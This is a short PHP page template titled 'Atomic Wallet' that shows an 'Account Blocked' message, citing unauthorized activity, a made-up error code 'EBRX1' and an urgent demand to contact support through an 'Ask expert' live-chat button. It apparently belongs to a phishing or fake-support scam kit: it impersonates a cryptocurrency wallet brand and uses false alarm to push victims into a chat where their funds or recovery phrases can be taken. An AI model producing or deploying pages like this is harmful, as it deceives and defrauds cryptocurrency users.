<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Atomic Wallet';
        include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 text-center">
                    <h2 class="fs30 my30 mb60 fw-bold">Account Blocked</h2>
                    <div class='pb10 text-center text-danger fs17'>Important Message</div>
                    <div class='pb10 text-center text-danger'>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately</div>
                    <div class='pb10 text-center fw-bold'>Error CODE: EBRX1</div>
                </div>
                <div class='text-center my20'>
                    <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary-2 text-white px20">Ask expert</a>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>